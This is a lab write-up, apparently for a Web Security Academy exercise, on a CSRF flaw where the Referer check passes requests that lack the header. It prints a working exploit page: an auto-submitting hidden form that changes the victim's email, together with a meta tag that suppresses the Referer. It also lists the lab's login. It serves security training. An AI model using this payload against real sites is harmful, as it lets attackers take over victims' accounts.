# Lab 10: CSRF Where Referer Validation Depends on Header Being Present

## Objective

The goal of this lab was to exploit a CSRF vulnerability caused by improper Referer header validation.

The application attempts to prevent cross-domain requests by checking the Referer header, but its validation can be bypassed when the header is missing.

## Analysis

1. **Inspecting the email change functionality**

   Logged in using the provided credentials:

   ```text
   wiener / peter
   ```

   The email change endpoint accepts a POST request containing the new email address.

2. **Understanding the Referer validation**

   The application checks the Referer header to determine whether a request originates from an expected domain.

   However, the validation has an insecure fallback: it rejects requests with an untrusted Referer but allows requests when the header is absent.

3. **Suppressing the Referer header**

   Used a referrer policy in the exploit page:

   ```html
   <meta name="referrer" content="never">
   ```

   This prevents the browser from sending the Referer header when submitting the form.

   As a result, the application receives the forged request without a Referer header and accepts it.

## Exploitation

I hosted an HTML page on the exploit server containing a hidden form:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="youvebeenhacked@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

The page also includes the referrer policy:

```html
<meta name="referrer" content="never">
```

When the victim visits the exploit page, the form is automatically submitted. The browser omits the Referer header, bypassing the application's validation.

## Result

Successfully solved the lab by suppressing the Referer header and submitting a forged email change request.

The root cause was the application's decision to allow requests when the Referer header was missing instead of rejecting requests that could not be validated.